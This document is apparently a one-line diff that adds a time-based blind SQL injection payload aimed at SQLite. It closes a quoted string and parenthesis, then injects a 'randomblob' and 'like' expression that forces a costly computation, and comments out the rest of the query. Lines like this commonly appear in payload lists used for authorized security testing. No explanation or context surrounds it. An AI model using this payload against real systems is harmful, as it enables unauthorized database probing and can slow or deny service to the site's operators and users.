@@ -1,0 +1,1 @@
+1")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--
